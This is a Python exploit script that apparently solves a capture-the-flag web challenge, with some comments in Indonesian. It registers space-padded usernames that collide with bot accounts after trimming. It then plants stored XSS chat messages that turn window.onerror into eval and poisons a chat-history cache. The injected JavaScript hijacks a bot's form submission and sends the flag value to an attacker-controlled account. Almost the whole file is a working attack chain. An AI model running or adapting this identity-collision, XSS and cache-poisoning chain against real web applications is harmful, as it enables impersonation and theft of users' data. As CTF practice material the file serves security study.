#!/usr/bin/env python3
import html
import json
import os
import random
import re
import string
import sys
import time
from urllib.parse import urljoin

import requests


TARGET = (sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET", "http://127.0.0.1:5000")).rstrip("/")
HACKER_ID = int(os.environ.get("HACKER_ID", "1"))
FLAGHOLDER_ID = int(os.environ.get("FLAGHOLDER_ID", "2"))
TIMEOUT = int(os.environ.get("TIMEOUT", "300"))

FLAG_RE = re.compile(r"(?:[A-Za-z0-9_]*CTF|FLAG)\{[^}<\r\n]{1,200}\}")


class UsernameTaken(Exception):
    pass


def randstr(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def pw():
    return "Aa1!" + randstr(16)


def url(path):
    return urljoin(TARGET + "/", path.lstrip("/"))


def post(s, path, **kwargs):
    kwargs.setdefault("timeout", 12)
    return s.post(url(path), **kwargs)


def get(s, path, **kwargs):
    kwargs.setdefault("timeout", 12)
    return s.get(url(path), **kwargs)


def register(username):
    password = pw()
    s = requests.Session()
    r = post(
        s,
        "/register",
        data={
            "username": username,
            "password": password,
            "confirmPassword": password,
        },
        allow_redirects=False,
    )

    body = r.text or ""
    if r.status_code == 409 or "already taken" in body:
        raise UsernameTaken(username)

    if r.status_code not in (301, 302, 303, 307, 308):
        raise RuntimeError(f"register failed for {username!r}: HTTP {r.status_code}\n{body[:300]}")

    if "tagger_session" not in s.cookies.get_dict():
        raise RuntimeError(f"no session cookie after registering {username!r}")

    return s, password


def collision_candidates(base):
    # Username harus trim() jadi persis "Hacker" / "FlagHolder",
    # tapi tetap unik dari bot account asli.
    max_spaces = 32 - len(base)
    seen = set()

    for total in range(1, max_spaces + 1):
        for left in range(total + 1):
            right = total - left
            name = (" " * left) + base + (" " * right)
            if name != base and name not in seen:
                seen.add(name)
                yield name


def register_collision(base):
    last_err = None
    for name in collision_candidates(base):
        try:
            s, password = register(name)
            print(f"[+] registered collision user: {name!r} -> trim={name.strip()!r}")
            return s, name, password
        except UsernameTaken as e:
            last_err = e
            continue

    raise RuntimeError(f"no usable collision username left for {base!r}: {last_err}")


def register_unique(prefix="loot"):
    for _ in range(40):
        username = f"{prefix}_{randstr(10)}"
        try:
            s, password = register(username)
            print(f"[+] registered receiver: {username!r}")
            return s, username, password
        except UsernameTaken:
            continue
    raise RuntimeError("failed to register unique receiver user")


def strip_tags(x):
    return re.sub(r"<[^>]+>", "", x, flags=re.S)


def find_user_id(s, exact_username, q):
    r = get(s, "/discover", params={"q": q})
    if r.status_code != 200:
        raise RuntimeError(f"discover failed: HTTP {r.status_code}")

    cards = re.findall(r'<article class="user-card">(.*?)</article>', r.text, flags=re.S)
    seen = []

    for card in cards:
        name_m = re.search(r"<h2>(.*?)</h2>", card, flags=re.S)
        if not name_m:
            continue

        name = html.unescape(strip_tags(name_m.group(1)))
        seen.append(repr(name))

        if name != exact_username:
            continue

        id_m = re.search(r'/friends/request/(\d+)', card)
        if not id_m:
            id_m = re.search(r'/chat/(\d+)', card)

        if not id_m:
            raise RuntimeError(f"found {exact_username!r}, but no id/action in card")

        return int(id_m.group(1))

    raise RuntimeError(
        f"could not find exact username {exact_username!r} in discover. seen={seen[:20]}"
    )


def accept_all_requests(s):
    r = get(s, "/requests")
    if r.status_code != 200:
        return 0

    ids = sorted(set(re.findall(r'/friends/accept/(\d+)', r.text)))
    accepted = 0

    for req_id in ids:
        rr = post(s, f"/friends/accept/{req_id}", allow_redirects=True)
        if rr.status_code in (200, 302):
            accepted += 1

    return accepted


def send_friend_request(s, user_id):
    r = post(s, f"/friends/request/{user_id}", allow_redirects=True)
    if r.status_code not in (200, 302):
        raise RuntimeError(f"friend request to {user_id} failed: HTTP {r.status_code}")


def send_xss_message(s, friend_id, js_payload):
    attrs = {
        "class": "cursor",
        "onanimationstart": "window.onerror=eval",
        "onanimationiteration": "throw this.textContent",
    }

    # Chrome reports a thrown string to window.onerror as "Uncaught <text>".
    # The leading '=' makes that whole string a valid assignment expression.
    content = "=" + js_payload

    r = post(
        s,
        f"/chat/{friend_id}/message",
        data={
            "message": "x",
            "tagName": "message",
            "type": "text",
            "attributes": json.dumps(attrs),
            "content": content,
        },
        allow_redirects=True,
    )

    if r.status_code not in (200, 302):
        raise RuntimeError(f"plant xss to friend {friend_id} failed: HTTP {r.status_code}")


def poison_cache(s, friend_id):
    # Ini mengisi messageHistoryCache memakai key username.trim():username.trim()
    r = get(s, f"/chat/{friend_id}", allow_redirects=True)
    return r.status_code == 200


def find_flag(text):
    text = html.unescape(text)
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def read_flag_from_receiver(receiver_session):
    r = get(receiver_session, f"/chat/{FLAGHOLDER_ID}", allow_redirects=True)
    if r.status_code != 200:
        return None
    return find_flag(r.text)


def read_flag_from_collision(session, friend_id):
    r = get(session, f"/chat/{friend_id}", allow_redirects=True)
    if r.status_code != 200:
        return None
    return find_flag(r.text)


def main():
    print(f"[+] target = {TARGET}")

    # Pair collision:
    # "Hacker " / "FlagHolder " trim() ke bot account asli.
    hacker_s, hacker_name, _ = register_collision("Hacker")
    flagger_s, flagger_name, _ = register_collision("FlagHolder")

    # User penerima flag.
    receiver_s, receiver_name, _ = register_unique("loot")

    flagger_fake_id = find_user_id(hacker_s, flagger_name, "FlagHolder")
    hacker_fake_id = find_user_id(flagger_s, hacker_name, "Hacker")
    receiver_id = find_user_id(hacker_s, receiver_name, receiver_name)

    print(f"[+] fake Hacker id     = {hacker_fake_id}")
    print(f"[+] fake FlagHolder id = {flagger_fake_id}")
    print(f"[+] receiver id        = {receiver_id}")

    print("[+] making fake Hacker <-> fake FlagHolder friendship")
    send_friend_request(hacker_s, flagger_fake_id)
    n = accept_all_requests(flagger_s)
    if n < 1:
        raise RuntimeError("fake FlagHolder did not accept any request")

    # Payload untuk browser Hacker asli:
    # bikin pesan real Hacker -> FlagHolder agar preview bot FlagHolder cocok:
    # conversation.preview === "Give me the flag!"
    h_payload = (
        f"fetch('/chat/{FLAGHOLDER_ID}/message',"
        "{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'message=Give+me+the+flag!'})"
    )

    # Payload untuk browser FlagHolder asli:
    # 1) kirim friend request ke receiver
    # 2) saat bot submit flag, cegah navigation lalu kirim isi input flag ke receiver
    f_payload = (
        f"fetch('/friends/request/{receiver_id}',{{method:'POST'}});"
        "document.querySelector('.composer').addEventListener('submit',e=>{"
        "e.preventDefault();"
        "let v=document.querySelector('#message-input').value;"
        f"fetch('/chat/{receiver_id}/message',"
        "{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},"
        "body:'message='+encodeURIComponent(v),keepalive:true})"
        "})"
    )

    print("[+] planting XSS messages in fake collision chat")
    send_xss_message(hacker_s, flagger_fake_id, h_payload)
    send_xss_message(flagger_s, hacker_fake_id, f_payload)

    print("[*] poisoning both cache directions and waiting for bot cycles...")
    # Do this once. Re-reading the collision chat immediately before the bot's
    # next cycle would refill the cache with fake rows and starve the bot's
    # real query when the 60-second TTL expires.
    poison_cache(hacker_s, flagger_fake_id)
    poison_cache(flagger_s, hacker_fake_id)

    deadline = time.time() + TIMEOUT
    last_log = 0
    next_collision_read = time.time() + 80

    while time.time() < deadline:
        accepted = accept_all_requests(receiver_s)
        if accepted:
            print(f"[+] receiver accepted {accepted} incoming request(s)")

        flag = read_flag_from_receiver(receiver_s)
        if not flag and time.time() >= next_collision_read:
            # After a bot cycle has repopulated an expired cache entry from
            # the real Hacker/FlagHolder IDs, the fake collision chat exposes
            # those rows to us.
            flag = read_flag_from_collision(hacker_s, flagger_fake_id)
            if not flag:
                flag = read_flag_from_collision(flagger_s, hacker_fake_id)
            next_collision_read += 60

        if flag:
            print("[+] flag captured")
            print(f"<FLAG>{flag}</FLAG>")
            return

        now = time.time()
        if now - last_log > 15:
            print("[*] still poisoning cache / checking receiver chat...")
            last_log = now

        time.sleep(3)

    raise RuntimeError("timeout: flag not captured; try increasing TIMEOUT=420")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[-] interrupted")
        sys.exit(130)
    except Exception as e:
        print(f"[-] {e}")
        sys.exit(1)
